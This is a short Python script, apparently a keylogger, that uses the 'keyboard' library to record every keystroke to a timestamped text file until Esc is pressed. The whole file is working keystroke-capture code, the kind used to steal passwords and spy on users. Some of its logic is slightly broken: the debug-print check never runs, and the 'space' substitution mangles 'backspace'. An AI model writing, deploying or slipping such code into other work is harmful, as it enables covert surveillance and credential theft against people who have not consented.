import sys
import os
import time
from datetime import datetime
import keyboard

def main():
    log_file = f"keylog_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt"
    
    try:
        with open(log_file, 'a', encoding='utf-8') as f:
            while True:
                event = keyboard.read_event()
                
                if event.name == 'esc':
                    break
                
                key_name = event.name.replace("space", "[SPACE]").replace("enter", "[ENTER]")
                f.write(f"{key_name}\n")
                
                # Optional debug print
                if "print" in locals() or "print" in globals():
                    print(key_name)
    except Exception as e:
        sys.stderr.write(f"Error: {e}")
        os._exit(1)
        
if __name__ == '__main__':
    main()